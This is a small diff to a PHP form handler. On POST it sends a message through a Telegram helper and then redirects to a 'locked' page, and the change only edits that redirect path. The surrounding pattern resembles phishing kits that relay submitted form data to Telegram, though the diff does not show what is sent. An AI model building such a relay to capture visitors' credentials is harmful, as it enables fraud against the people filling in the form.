@@ -32,7 +32,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     sendTelegramMessage($messageTitle, $message);
     
     // Redirect to locked page
-    header("Location: /Auth/locked/");
+    header("Location: /locked/");
     exit();
 } else {
     // Redirect back
